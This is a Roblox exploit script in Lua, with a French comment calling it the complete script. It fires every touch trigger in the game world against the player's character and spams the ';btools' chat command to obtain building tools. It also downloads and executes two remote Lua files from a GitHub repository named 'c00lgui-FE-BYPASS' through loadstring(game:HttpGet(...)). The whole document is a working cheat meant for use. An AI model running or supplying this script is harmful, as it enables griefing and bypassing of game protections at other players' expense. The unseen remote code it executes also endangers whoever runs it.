-- le script complet

local root = game.Players.LocalPlayer.Character.HumanoidRootPart

    local function touch(x)

        x = x:FindFirstAncestorWhichIsA("Part")

        if x then

            if firetouchinterest then

                task.spawn(function()

                    firetouchinterest(x, root, 1)

                    wait()

                    firetouchinterest(x, root, 0)

                end)

            end

            

        end

    end

    

for _, descendant in ipairs(workspace:GetDescendants()) do

            if descendant:IsA("TouchTransmitter") then

                touch(descendant)

            end

        end

        

game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Died:Connect(function()

        wait(1.9)

	game.Players:Chat(";btools")

end)

loadstring(game:HttpGet("https://raw.githubusercontent.com/cnPthPiGon/c00lgui-FE-BYPASS/refs/heads/main/ss.lua"))()

loadstring(game:HttpGet("https://raw.githubusercontent.com/cnPthPiGon/c00lgui-FE-BYPASS/refs/heads/main/K00pkidd.lua"))()

while task.wait(5) do

game.Players:Chat(";btools")

end
